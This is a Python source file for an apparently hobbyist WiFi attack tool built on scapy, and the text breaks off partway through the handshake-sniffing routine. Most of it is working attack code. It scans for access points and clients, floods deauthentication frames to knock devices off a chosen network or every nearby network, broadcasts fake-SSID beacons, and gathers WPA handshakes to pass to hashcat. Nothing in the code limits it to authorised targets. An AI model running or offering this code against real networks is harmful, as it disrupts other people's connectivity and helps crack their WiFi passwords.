# WIFI SCANNER  // DEAUTH MODULE // THIS WILL HOLD MALICIOUS LOGIC MEANT FOR ETHICAL REASONS


# UI IMPORTS
import pyfiglet
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.console import Console
console = Console()

# NETWORK IMPORTS
import pywifi, socket, ipaddress
from scapy.all import sniff, RadioTap, IP, ICMP, sr1, sendp, RandMAC
from scapy.layers.eap import EAPOL
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeReq



# NSM IMPORTS
from nsm_utilities import Utilities, NetTilities, Background_Threads
from nsm_files import Settings, Recon_Pusher


# ETC IMPORTS 
import threading, os, random, time, pyttsx3, string


# THREAD LOCKER
LOCK = threading.Lock()

test = False

if test:
    # THINGS TO STUDY FOR MATH ASVAB 
    MATH = ["percentage", "algebra", "PEMDAS", "Area & Distance", "regular to fraction", "factor equations", "angle of triangle", "area and volume"]


    for m in MATH:
        console.print(m)
    print("\n\n")


    # USE THIS TO INSTALL LIBARIES IN VENV
    # source .venv/bin/activate


    # RUN THIS FOR NOW TO BEGIN DEAUTH MODULE
    # sudo ./.venv/bin/python nsm_deauth.py



class Frame_Snatcher():
    """This class will be responsible for sniffing out frames and or pulling mac address"""


    macs = []   
    beacons = []
    num = 1 


    def __init__(self):
        pass
    

    
    @classmethod
    def get_interface(cls):
        """This method will be used to get the user interface and automatically create a file saving it for default use"""

        
        try:
            # SET DEFAULT IFACE IF AVAILABLE
            data = Settings.get_json()
            def_iface = data['iface']


            # GIVE OPTION FOR DEFAULT
            if def_iface != "":
                use = f"or press enter for {def_iface}"
            
            else:
                use = ""

            
            while True:
                iface = console.input(f"[bold blue]Enter iface {use}: ").strip()
                

                # NEED SOME TYPE OF IFACE
                if iface == "" and def_iface == "":

                    console.print("You must enter iface to procced silly", style="bold red")

                
                # ROLL BACK TO DEFAUT
                elif iface == "":
                    iface = def_iface

                    return iface
                

                
                # SET NEW DEF IFACE
                else:
                    data['iface'] = iface
                    
                    # NOW TO UPDATE SETTINGS
                    Settings.push_json(data=data)

                    return iface
            

        # ERROR 
        except Exception as e:
            console.print(f"[bold red]Exception Error:[yello] {e}")
                    

    @classmethod
    def welcome_ui(cls, iface , text="    WiFi \nHacking", font="dos_rebel", c1="bold red", c2="bold purple", skip=False):
        """This method will house the welcome message"""


        # SET THE MODE
        mode = 1



        if mode == 1:


            # CREATE THE VAR
            welcome = pyfiglet.figlet_format(text=text, font=font)
            
            print('\n\n')
            console.print(welcome, style=c2)
            console.print(f"\n[bold red]Current iface:[bold green] {iface}\n\n")
            if skip == False:
                console.input("[bold red]Press ENTER to Sniff! ")
            print('\n')


        

        elif mode == 2:

            fonts = pyfiglet.FigletFont.getFonts()


            for f in fonts:

                welcome = pyfiglet.figlet_format(text=text, font=f)

                console.print(welcome, style=c2)

                console.print(f"[bold blue]Current Font:[bold green] {f}\n\n")
                

                if f == "dos_rebel":
                    t = 3
                
                else:

                    t = 0.3



                time.sleep(t)


    @classmethod
    def sniff_for_targets(cls, iface="wlan0", verbose=1, timeout=15):
        """This method will be used to sniff out mac addresses using the sniff function"""

        # COUNT THE ATTEMPTS
        tempt = 1   


        # LOOP THAT BITCH
        try:
            while True:

                
                # OUTPUT ATTEMPT
                console.print(f"Sniff Attempt #{tempt}", style="bold green")

                    
                # SNIFF THAT BITCH
                sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15)

                time.sleep(1)
                
                # APPEND TEMPT
                tempt += 1

                
                # KEEP LOOPING UNTIL TRUE
                if cls.beacons:
                    

                    # SNIFF AGAIN
                    sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15)

                    break
        

        except Exception as e:
            console.print(f"[bold red]\n\nException Error:[yellow] {e}")

            console.input("[bold green]\nPress enter to return the the Main Menu: ")


            # RETURN TO MAIN MODULE
            from nsm_ui import MainUI
            MainUI.main()
            

    @classmethod
    def packet_parser(cls, pkt):
        """This method will be called upon to then parse the given packet"""


        
        def parser(pkt):


            # COLORS
            c1 = "bold yellow"
            c2 = "bold red"
            c3 = "bold blue"
            c4 = "bold green"

            
        
            # THIS IS STRICTLY USED TO CAPTURE BEACON FRAMES // SENT FROM AP'S
            if pkt.haslayer(Dot11Beacon):

                
                # SET VARS
                addr1 = str(pkt[Dot11].addr1) if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else "No"
                addr2 = str(pkt[Dot11].addr2) if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else "No"


                # GET SSID
                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"

                # GET VENDOR
                vendor = Utilities.get_vendor(mac=addr2)

                if vendor:
                    text = f"Vendor: {vendor}"
                
                else:
                    text = ""
                

                channel = Background_Threads.get_channel(pkt=pkt)
                


                #ssid, channel, rsn, info, vendor = NetTilities.get_ies(pkt=pkt, sort=True, ap=True)



                
                # THIS IS HERE JUST TO BE HERE FRL
                if addr1 not in cls.macs and addr1 != "No":
                    

                    # ADD MAC
                    cls.beacons.append((ssid, addr1, vendor, channel))
                    cls.macs.append(addr1)
                    cls.num += 1


                    # NOW TO OUTPUT RESULTS
                    console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr1}  -  {channel}")



                # BEACON == AP FRAMES ONLY           
                if addr2 not in cls.macs and addr2 != "No":


                    # ADD MAC
                    cls.beacons.append((ssid, addr2, vendor, channel))
                    cls.macs.append(addr2)
                    cls.num += 1



                    # NOW TO OUTPUT RESULTS
                    console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr2}  -   {channel}") #  -  [{c1}]{ssid}")
        



        threading.Thread(target=parser, args=(pkt,), daemon=True).start()
            

   
    @classmethod
    def track_clients(cls, target, iface, track=True, delay=5):
        """This method will be responsible for tracking the online clients"""


        # DESTROY ERRORS
        verbose = True
        cls.SNIFF = True

        
        # CREATE A CLIENT LIST

        def sniff_for_clients(timeout=0):
            """This will be used to sniff for clients"""


            console.print("\n -----  SNIFF STARTED  ----- ", style="bold green")
            

            # BEGIN THE SNIFF
            while cls.SNIFF:
                sniff(iface=iface, prn=parse_for_clients, count=0, store=0, timeout=2) #timeout=timeout)
        
            console.print("\n -----  SNIFF ENDED  ----- ", style="bold red")



        def parse_for_clients(pkt):
            """This will be used to parse for clients"""



            # CHECK IF YOUR ALLOWED TO BE ALIVE
            if cls.SNIFF:
            

                # FILTER FOR WIFI FRAMES
                if pkt.haslayer(Dot11):


                    # ADDR VARS
                    addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                    addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
    
                    
                    # VALID CLIENTS ONLY
                    if addr1 == target or addr2 == target:

                        
                        
                        # ADDR1
                        if addr1 != target and addr1 not in cls.clients and addr1:


                            # ADD TO LIST
                            cls.clients.append(addr1)

                            if verbose:
                                console.print(f"Client: {addr1} --> {target}")

                    
    
                        # ADDR2
                        elif addr2 != target and addr2 not in cls.clients and addr2:


                            # ADD TO LIST
                            cls.clients.append(addr2)

                            if verbose:
                                console.print(f"Client: {addr2} --> {target}")



        # START TRACKING CLIENTS
        threading.Thread(target=sniff_for_clients, daemon=True).start()

        

        #console.print("----- STARTED -----", style="bold green")
        time.sleep(10)

        # LOOP THIS BITCH
        while cls.SNIFF:
            
            # RESET CLIENT LIST
            cls.clients = []
            console.print("wiped", style="bold red")
            time.sleep(delay)


    @classmethod
    def target_chooser(cls, type):
        """In this method the user will choose which target they want to attack"""

       
        # CREATE VARS
        data = {}
        num = 0
        error = False
        verbose = False


        # CREATE A TABLE AND OUTPUT IT
        table = Table(title="Targets", style="bold purple", border_style="bold red", title_style="bold purple", header_style="bold purple")
        table.add_column("Key", style="bold red")
        table.add_column("SSID", style="bold blue")
        table.add_column("MAC Addr", style="bold green")
        table.add_column("Vendor", style="yellow")
        table.add_column("Channel", style="red")
        


        # LOOP THROUGH RESULTS
        for var in cls.beacons:


            # APPEND NUMBER
            num +=1 

            # ADD TO DICT
            data[num] = var[1]


            # ADD TO TABLE
            table.add_row(f"{num}", f"{var[0]}",  f"{var[1]}", f"{var[2]}", f"{var[3]}")
            
        

        # CREATE VAR
        keys = num


        
        print('\n\n')
        console.print(table)
        print('\n')



        @staticmethod
        def rescan_option():
            """This function will be used to ask to user weather or not they want to do another scan or continue with the results"""
        
 
            
            # USER INPUT
            choice = console.input("[bold red]Do you want to rescan?[bold green] (y/n): ").strip().lower()


            if choice in ["1", "yes", "y", "go", "yea"]:

                
                
                # RETURN TO MODULE MAIN METHOD
                Utilities.clear_screen()
                Frame_Snatcher.main(skip=True, type=type)


            elif choice in [0, "no", "n", "nope", "nah"]:

                return False

            
            else:

                return False
        
        

        # ASK THE USER IF THEY WANT TO RESCAN
        rescan_option()


        
        # DESTROY ERRORS
        while True:
            try:
                
                
                # FOR CLEANER OUTPUT
                if error:
                    console.print(f"\n[bold red]Enter a key[bold red] 1 - {num},[bold green] to choose your target!")
                    error = False 


                # USER CHOOSES THERE TARGET
                choice = console.input(f"[bold red]Who do you want to attack?: ").strip()

                # INT IT 
                choice = int(choice)



                if choice in range(1, num) or choice == num:
                    target = data[choice]
                    console.print(cls.beacons)
                    console.print(cls.beacons[choice])
                    channel = cls.beacons[choice][3]
                    console.print(channel)


                    console.print(f"\n[bold red]Target choosen:[yellow] {target}")

                    
                    # RETURN THE TARGET
                    return target, channel
                
                

                # OUTSIDE OF NUM
                else:
                    error = True
                    
            
            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except KeyError as e:
                
                if verbose:
                    console.print(e)


                error = True

            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except TypeError as e:

                if verbose:
                    console.print(e)


                error = True
            

        
            
            # ELSE
            except Exception as e:

                if verbose:

                    console.print(f"[bold red]Exception Error:[yellow] {e}")

                
                if error == False:
                    error = 1
                
                elif error:
                    error += 1
                

                # SAFETY CATCH
                if error == 4:

                    console.print("Alright ur done for", style="bold red")
                    break
    

    @classmethod
    def client_chooser(cls, target, iface, verbose=0, timeout=120):
        """This method will be responsible for grabbing the single client on the target <-- TYPE 1"""

        
        # VARS
        clients = []
        clients_info = []
        verbose = True


        # CREATE TABLE
        table = Table(title="Client List", title_style="bold red", style="bold purple", border_style="purple", header_style="bold red")
        table.add_column("#")
        table.add_column("MAC Addr", style="bold blue")
        table.add_column("-->", style="bold red")
        table.add_column("AP", style="bold green")
        table.add_column("Vendor", style="bold yellow")


        
        # SNIFF FOR CLIENTS FIRST
        def small_deauth():
            """Send a deauth packet and sniff the reconnected macs"""

            sent = 0


            # DELAY WAIT FOR SNIFF
            time.sleep(3)


            # FUNCTION
            while sent < 10:

                # RANDOMIZE THE DEAUTH
                reasons = random.choice([4,5,7,15])
                
                # CRAFT THE FRAME
                frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
                

                # SEND THE FRAME
                sendp(frame, iface=iface, verbose=False)


                # WAIT
                time.sleep(1)


                # GO
                sent += 1

                if verbose:
                    console.print(f"Deauth --> {target}  -  Reason: {reasons}", style="bold red")


        def client_sniffer(pkt):
            """This will sniff client macs connected to the target"""

            
            # CATCH
            try:

                # FILTER FOR DOT11 FRAMES
                if pkt.haslayer(Dot11):

                    
                    # COLLECT ADDR1 & ADDR2
                    addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                    addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False

                    

                    # CHECK FOR TARGET
                    if addr1 == target or addr2 == target:

                        

                        # ADDR1
                        if addr1 != target and addr1 not in clients and addr1:


                            # GET VENDOR
                            vendor = Utilities.get_vendor(mac=addr1)
                            
                            # APPEND TO LIST
                            clients.append(addr1)

                            # FOR INFO
                            clients_info.append((addr2, vendor))


                            # ADD DATA TO TABLE
                            table.add_row(f"{len(clients)}", f"{addr1}", " --> ", f"{target}", f"{vendor}")

                        
                        
                        # ADDR2
                        elif addr2 != target and addr2 not in clients and addr2:


                            # GET VENDOR
                            vendor = Utilities.get_vendor(mac=addr2)

                            
                            # APPEND TO LIST
                            clients.append(addr2)

                            # FOR INFO
                            clients_info.append((addr2, vendor))


                            # ADD DATA TO TABLE
                            table.add_row(f"{len(clients)}", f"{addr2}", " --> ", f"{target}", f"{vendor}")



            # BREAK
            except KeyboardInterrupt as e:
                console.print(f"[bold red]YOU ESCAPED THE MATRIX:[yellow] {e}")                
            
            
            # ERROR
            except Exception as e:
                console.print(f"[bold red]Exception Error:[yellow] {e}")


    

        # START A BACKGROUND THREAD
        threading.Thread(target=small_deauth, daemon=True).start()


        # SNIFF RESULTS
        #sniffed = 0
        #while sniffed < 60:
        console.print(f"\nI will now begin to sniff for clients for the next {timeout} seconds if you want to stop earlier press [bold green]ctrl + c!\n", style="bold red")
        time.sleep(2)

        # SNIFF
        with Live(table, console=console, refresh_per_second=2):
            sniff(iface=cls.iface, prn=client_sniffer, store=0, count=0, timeout=timeout)
        

        
        data = {}
        num = 0
        error = False
        for client in clients:

            # NUM
            num += 1

            # ADD DATA
            data[num] = client
        
        console.print(data)

        # DESTROY ERRORS
        while True:
            try:
                
                
                # FOR CLEANER OUTPUT
                if error:
                    console.print(f"\n[bold red]Enter a key[bold red] 1 - {num},[bold green] to choose your target!")
                    error = False 


                # USER CHOOSES THERE TARGET
                choice = console.input(f"[bold red]Who do you want to attack?: ").strip()

                # INT IT 
                choice = int(choice)



                if choice in range(1, num) or choice == num:
                    target = data[choice]


                    console.print(f"\n[bold red]Target choosen:[yellow] {target}")

                    
                    # RETURN THE TARGET
                    return target
                
                

                # OUTSIDE OF NUM
                else:
                    error = True
                    
            
            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except KeyError as e:
                
                if verbose:
                    console.print(e)


                error = True

            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except TypeError as e:

                if verbose:
                    console.print(e)


                error = True
            

        
            
            # ELSE
            except Exception as e:

                if verbose:

                    console.print(f"[bold red]Exception Error:[yellow] {e}")

                
                if error == False:
                    error = 1
                
                elif error:
                    error += 1
                

                # SAFETY CATCH
                if error == 4:

                    console.print("Alright ur done for", style="bold red")
                    break


    @classmethod
    def target_attacker(cls, target, client="ff:ff:ff:ff:ff:ff", verbose=1, iface="wlan0", inter=0.1, count=25):
        """This method will be responsible for attacking the choosen target"""


        # VARS
        packets_sent = 0
        error = 0


        # NOW TO TRACK THE AMOUNT OF CLIENTS ON THE AP
        threading.Thread(target=Frame_Snatcher.track_clients, args=(target, cls.iface), daemon=True).start()

        
        # BEGINNING OF THE END
        use = 2
        if use == 1:
            console.print(f"\n[bold red]Now Launching Attack on:[bold green] {target}\n\n")
        elif use == 2:
            console.print(f"\n[bold red]Attacking  ----->  [bold green]{target}[/bold green]  <-----  Attacking\n\n")

        time.sleep(2)



        # CREATE LIVE PANEL
        down = 5
        panel = Panel(renderable=f"Launching Attack in {down}", style="bold yellow", border_style="bold red", expand=False, title="Attack Status")




        # LOOP UNTIL CTRL + C
        with Live(panel, console=console, refresh_per_second=4):


            # UPDATE RENDERABLE THIS IS THE COUNTDOWN UNTIL START
            while down > 0:
                
                # OUTPUT N UPDATE
                panel.renderable = f"Launching Attack in: {down}"
                down -= 1
                
                # NOW FOR THE ACTUAL DELAY LOL
                time.sleep(1)
            

            # USE THIS VARIABLE TO BREAK NESTED LOOP
            STAY = True
            
            # NOW FOR THE ATTACK
            while STAY:
                try:


                    
                    # GET REASON FOR BEING KICKED OFF / CHOOSE DIFFERENT ONES IN CASE SOME WORK BETTER THEN OTHERS
                    reasons = random.choice([4,5,7,15])

                    # CREATE THE LAYER 2 FRAME
                    frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reasons)


                    # NOW TO SEND THE FRAME
                    sendp(frame, iface=iface, inter=inter, count=count, verbose=verbose)

                    

                    # UPDATE VAR & PANEL
                    packets_sent += count

                    # COLORS
                    c1 = "bold red"

                    panel.renderable = (
                        f"[{c1}]Target:[/{c1}] {target}  -  " 
                        f"[{c1}]Client:[/{c1}] {client}  -  " 
                        f"[{c1}]Total Frames Sent:[/{c1}] {packets_sent}  -  "  
                        f"[{c1}]Reason:[/{c1}] {reasons}  -  "  
                        f"[{c1}]Clients:[/{c1}] {len(cls.clients)}"

                        )

                    
            


                except KeyboardInterrupt as e:
                    console.print(e)

                    
                    # WAIT
                    while STAY:
                        try:
                            console.print(f"Cleaning up", style="bold red")
                            time.sleep(3)

                            STAY = False       # BREAK NESTED LOOP
                            cls.SNIFF = False  # KILL BACKGROUND THREAD 
                            break             # JUST IN CASE
                        

                        except KeyboardInterrupt as e:
                            console.print("STOP PRESSING ctrl + c", style="bold red")
                        

                

                except Exception as e:
                    console.print(f"[bold red]Exception Error:[yellow] {e}")


                    if error < 4:
                        error += 1
                    
                    else:
                        
                        console.print("[bold red]Max Amount of Errors Given!")


                        STAY = False       # BREAK NESTED LOOP
                        cls.SNIFF = False  # KILL BACKGROUND THREAD
                        break             # JUST IN CASE
                    
    
    @classmethod
    def main(cls, type, skip=False):
        """This is where the module will spawn from"""


        # CLEAR SCREEN
        Utilities.clear_screen()


        # CLEAN VARS
        cls.macs = []
        cls.beacons = []
        cls.num = 1
        cls.clients = []

        
        # CATCH YOU 
        try:

            # GET GLOBAL IFACE
            cls.iface = Frame_Snatcher.get_interface()
            

            # PRINT WELCOME UI
            Frame_Snatcher.welcome_ui(skip=skip, iface=cls.iface)


            # START AUTO HOPPER // FOR NOW
            Background_Threads.channel_hopper(verbose=False)

            
            # SNIFF FOR TARGETS
            Frame_Snatcher.sniff_for_targets(iface=cls.iface)
            Background_Threads.hop = False


            # ALLOW THE USER TO CHOOSE THERE TARGET
            target, channel = Frame_Snatcher.target_chooser(type=type)


            # HOP CHANNELS
            Background_Threads.channel_hopper(set_channel=channel)


            # NOW TO TRACK THE AMOUNT OF CLIENTS ON THE AP
            # threading.Thread(target=Frame_Snatcher.track_clients, args=(target, cls.iface), daemon=True).start()


            # ALL CLIENT ATTACK
            if type == 2:

                # ATTACK ALL CLIENTS ON TARGET
                Frame_Snatcher.target_attacker(target=target, iface=cls.iface)   


            # SINGLE CLIENT 
            elif type == 1:

                # SNAG CLIENT
                client = Frame_Snatcher.client_chooser(target=target, iface=cls.iface)
                
                # NOW ATTACK CLIENT ON TARGET
                Frame_Snatcher.target_attacker(target=target, client=client, iface=cls.iface)


            # LEAVE
            time.sleep(.2);  console.input("\n\n[bold green]Press Enter to Return: ")
        

        
        except KeyboardInterrupt as e:
            console.print(e)



        except Exception as e:
            console.print(f'[bold red]Exception Error:[yellow] {e}')   


class Beacon_Flooder():
    """This class will be responsible for creating and flooding fake APs to nearby devices"""
    

    # CLASS VARS
    trolling_ssids = [
            "FBI_Surveillance_Van",
            "PrettyFlyForAWiFi",
            "ItHurtsWhenIP",
            "DropTablesWiFi;",
            "Virus_AP_DoNotConnect",
            "NSA_CoffeeShop",
            "404_WiFi_Not_Found",
            "Free_Vbucks_5GHz",
            "TellMyWiFiLoveHer",
            "Barii_Hacking_You",
            "LAN_of_the_Free",
            "WuTangLAN",
            "C:\Virus.exe",
            "Give_Us_Your_Data",
            "Pay4WiFi_Loser",
            "Open_AP_Honeypot",
            "DefinitelyNotAScam",
            "Connect_And_Cry",
            "Skynet_Online",
            "Free_Crypto_Mining"
        ]
    
    # f
    christmas_ssids = [
            "MerryChristmas",
            "Merry_Christmas",
            "MerryChristmas_WiFi",
            "MerryChristmas_Guest",
            "MerryChristmas24",
            "MerryChristmasNet",
            "MerryChristmasLAN",
            "MerryChristmasHome",
            "MerryChristmas_AP",
            "MerryChristmas_Free",

            "MerryXmas",
            "Merry_Xmas",
            "MerryXmas_WiFi",
            "MerryXmas_Guest",
            "MerryXmas24",
            "MerryXmasNet",

            "HappyHolidays",
            "Happy_Holidays",
            "HappyHolidays_WiFi",
            "HappyHolidays_Guest",

            "ChristmasWiFi",
            "Christmas_WiFi",
            "ChristmasGuest",
            "Christmas24"
        ]


    
    def __init__(self):
        pass



    @classmethod
    def _choose_ssid_type(cls):
        """This metod will allow the user to choose the type of ssid list to advertise"""


        console.print(
            "1. ssids_trollings",
            "\n2. ssids_christmas",
            "\n3. Enter Custom list"
        )


        while True:

            try:

                choice = console.input("\n\n[bold blue]Enter ssid type: ").strip()

                if choice == "1": return   cls.trolling_ssids
                elif choice == "2": return cls.christmas_ssids
                elif choice == "3":

                    console.print("[bold green]Enter ssids seperated by a comma ','  Press enter when your done!")


                    raw = console.input("\n\n[bold yellow]Enter custom ssids: ").strip(); ssids = []
                    clean = (raw.split(',')) 
                    for c in clean: ssids.append(c) if c != "," else ''
                    return ssids
                
                else: console.print("Choose a valid option goofy")
            

            except Exception as e:
                console.print(f"[bold red]Exception Error:[bold yellow] {e}"); input()
        

    @classmethod
    def get_bssid(cls, type):
        """This method will create a bssid"""


        # 1 == RANDOM
        if type == 1:
            mac = str(RandMAC())
            parts = mac.split(':')
            # Force unicast (bit 0 = 0) and locally administered (bit 1 = 1)
            first_octet = (int(parts[0], 16) & 0xFE) | 0x02
            return "%02x:%s" % (first_octet, ':'.join(parts[1:]))


        elif type == 2:
            return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))


        pass


    
    @classmethod
    def get_frames(cls, amount, ssid_type, bssid_type, client="ff:ff:ff:ff:ff:ff"):
        """This method will create the frame"""


        # VAR
        frames = []
        verbose = True
        print("\n\n")

        b =  Beacon_Flooder() 
        
        # DEAPPRECIATED // TERRIBLE LOGIC LOL
        if ssid_type == 99:
            while amount >= 0:


                # GET SSID
                ssid =  ssid_type

                # GET BSSID
                bssid = Beacon_Flooder.get_bssid(type=bssid_type)


                # CRAFT FRAME
                dot11 = Dot11(type=0, subtype=8, addr1=client, addr2=bssid, addr3=bssid)
                beacon = Dot11Beacon(cap="ESS+privacy")
                essid = Dot11Elt(ID="SSID", info=ssid.encode(), len=len(ssid))
                dsset = Dot11Elt(ID="DSset", info=b'\x06')
                rates = Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
                frame = RadioTap()/dot11/beacon/essid/dsset/rates


                # APPEND AND GO
                frames.append(frame)

                amount -= 1


                if verbose:
                    console.print(f"[bold red]Frame Creation --> [bold yellow]{frame}")
            

        else:            

            seq = 0
            for ssid in ssid_type:

                bssid = Beacon_Flooder.get_bssid(type=bssid_type)

                # CRAFT FRAME
                frame = (
                    RadioTap() /
                    Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid, SC=(seq << 4)) /
                    Dot11Beacon() /
                    Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
                )

                # APPEND AND GO
                frames.append(frame)
                seq = (seq + 1) % 4096  # Sequence wraps at 4096


                if verbose:
                    console.print(f"[bold red]Frame Creation --> [bold yellow]{frame}")

            print('\n')
            return frames


                

        
        # NOW RETURN THE LIST OF FRAMES
        return frames
    
   

    @classmethod
    def frame_injector(cls, frames, count=1):
        """This method will inject the frames into the network"""


        # VARS
        sent = 0
        down = 5
        c1 = "bold red"

        # PANEL
        panel = Panel(renderable=f"Launching Attack in {down}" , title="Attack Status", style="bold yellow", border_style="bold red", expand=False)


        # LOOP
        with Live(panel, console=console, refresh_per_second=4):


            # COUNT DOWN
            while down != 0:
                

                # PANEL
                panel.renderable = f"Launching Attack in {down}"
                time.sleep(1)

                
                # DECREASE 
                down -= 1

            
            # LOOP FOR ERRORS
            while True:

                try:

                    

                    sendp(frames, verbose=0, iface=cls.iface);  sent += count * len(frames)


                    panel.renderable = (
                        f"[{c1}]Targets:[/{c1}] {len(frames)}  -  " 
                        f"[{c1}]Frames Sent:[/{c1}] {sent}  -  " 
                        )
                    

                    time.sleep(0.1)
                    


                
                # THIS LOGIC IS TO SUBSIDIZE SENDP
                except KeyboardInterrupt as e:
                    console.print(f"ATTEMPTING TO ESCAPE THE MATRIX", style="bold red")

                    try:
                        time.sleep(0.5)

                        break
                    

                    except KeyboardInterrupt as e:
                        console.print("STOP PRESSING CTRL + C", style="bold yellow")


                
                # GENERAL ERRORS
                except Exception as e:
                    console.print(e)
                    

                    # FOR CONSISTENT ERRORS
                    if down < 3:
                        down += 1
                    
                    elif down == 4:
                        console.print("[bold red]MAX ERRORS OCCURED: 4")
                        time.sleep(2)
                        break


    @classmethod
    def main(cls):
        """This is where class wide logic will be performed from"""

        
        # CATCH
        try:

            # GET IFACE3
            cls.iface = Frame_Snatcher.get_interface()


            # OUTPUT UI
            Frame_Snatcher.welcome_ui(iface=cls.iface, text="    WiFi \nSpoofing", skip=True)


            # SET CHANNEL
            Background_Threads.channel_hopper(set_channel=int(6)); time.sleep(0.2)


            ssid_type = Beacon_Flooder._choose_ssid_type()

    
            # CRAFT FRAMES
            frames = Beacon_Flooder.get_frames(ssid_type=ssid_type, bssid_type=1, amount=15)

            
            # INJECT THE FRAMES
            Beacon_Flooder.frame_injector(frames=frames)


            console.print(frames)


        except KeyboardInterrupt as e:

            console.print(e) 
       

        except Exception as e:
            
            console.print(f"[bold red]Exception Error:[yellow] {e}")


class Hash_Snatcher():
    """This method will snatch handshakes out the air and potentially pass them to hashcat"""


    # USE THIS TO KILL BACKGROUND THREAD
    SNIFF = True

    
    def __init__(self):
        pass

    


    @classmethod
    def sniff_for_ap(cls, iface, timeout=15):
        """This will sniif for APs in the area"""



        def sniffer():
            """This will sniff"""


            # VARS
            count = 0


           # console.print("\n ---  SNIFF STARTED  --- \n", style="bold green")
            

            # CLOSE EMPTY LIST
            while True:

                try:

                    count += 1

                    console.print(f"Sniff Attempt #{count}", style="bold red")
                    
                    sniff(iface=iface, store=0, timeout=timeout, prn=parser)

                    if cls.ssids:

                        # SNIFF AGAIN
                        sniff(iface=iface, store=0, timeout=timeout, prn=parser)

                        break
                

                except Exception as e:
                    console.print(f"[bold red]\n\nException Error:[yellow] {e}")

                    console.input("[bold green]\nPress enter to return the the Main Menu: ")


                    # RETURN TO MAIN MODULE
                    from nsm_ui import MainUI
                    MainUI.main()
                    
           # console.print("\n ---  SNIFF ENDED  --- \n", style="bold red")


        def parser(pkt):
            """Parse packets"""


            
            # LAYERS
            if pkt.haslayer(Dot11Beacon):

                

                # SET ADDR
                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False



                # SET SSID
                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"



                if addr2 and ssid not in cls.ssids:

                    
                    console.print(f"[bold red][+] SSID Found:[bold yellow] {ssid}")
                    cls.ssids.append(ssid)
                    cls.mac_ifo.append((addr2, ssid))
    


        
        # START
        sniffer()

    
    
    @classmethod
    def target_attacker(cls, iface, verbose=True):
        """This will send deauth packets to AP clients"""



        def looper():
            """Loop targets"""

            
            # VARS
            frames = []



            
            # ITER
            for mac in cls.mac_ifo:
                
                
                # GET FRAMES // PLURAL FOR REASONS
                ssid_frames = frame_creation(target=mac[0])


                # APPEND
                frames.append(ssid_frames)


                if verbose:
                    console.print(f"Frame Creation -->[bold green] {mac[1]}", style="bold red")
                    time.sleep(0.05)
 
                
            
            # DONE
            console.print(frames)
            console.print("\nAll frames Succesfully made!", style="bold green")
            time.sleep(2)


            # RETTURN RESULTS
            return frames


        def frame_creation(target, client="ff:ff:ff:ff:ff:ff"):
            """This will create frames"""


            framess = []


            # REASON FOR KICKING
            #reasons = [4,5,7,15]
            

            # ITERATE
            reasons = random.choice([4,5,7,15])


            # CRAFT FRAME
            frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
                

            # APPEND
            framess.append(frame)

            

            return frame

        
        def attack(frames, sent=50, count=10, verbose=False, delay=1, realtime=0):
            """Attack clients on AP's"""
            

            # VARS

            
            # LOOP ERROS
            while sent != 0 and cls.SNIFF:
                    
                # SNATCH ERRORS
                try:
                
                    # INJECT FRAMES
                    sendp(frames, count=count, iface=iface, verbose=verbose, realtime=realtime)


                    
                    # ALERT
                    console.print(f"Deauth --> {len(cls.ssids)} Targets ", style="bold red")


                    # DOWN
                    sent -= 1
                    time.sleep(delay)



                # DESTROY
                except KeyboardInterrupt as e:
                    console.print(e)

                    cls.SNIFF = False  # KILL BACKGROUND THREAD
                

                except Exception as e:
                    console.print(f"[bold red]Exception Error:[bold yellow] {e}")
        
        
        
        # WAIT FOR THREAD
        time.sleep(2)
        console.print("BACKGROUND THREAD STARTED", style="bold green")

        # START
        cls.SNIFF = True
        frames = looper()


        # NOW ATTACK
        attack(frames=frames, count=50, delay=10, sent=3, realtime=0)


        # NOW SLOW ATTACK
        attack(frames=frames, count=10, delay=10)


        # DONE
        console.print("\n --- DEAUTH ENDED --- ", style="bold red")



    @classmethod
    def sniff_for_hashes(cls, iface, timeout=60):
        """This method will be responsibe sniffing handshakes"""


        
        
        def sniffer():
            """This will sniff"""

            

            # START SNIFF
            STAY = True
            console.print("\n ---  SNIFF STARTED  --- ", style="bold green")


            # SNIFF
            while STAY:

                try:
                    sniff(iface=iface, prn=parser, store=0, timeout=timeout)


                    # FOR WHEN SNIFF FAILED LET USER NOW ITS STILL RUNNING
                    console.print("Still Sniffing\n", style="bold green")
                    

                    # DELAY FOR CTR + C
                    time.sleep(1)
                
                

                # FOR USER LEAVING
                except KeyboardInterrupt as e:
                    console.print(f"{e}")

                    while STAY:
                        try:
                            console.print(f"Cleaning up", style="bold red")
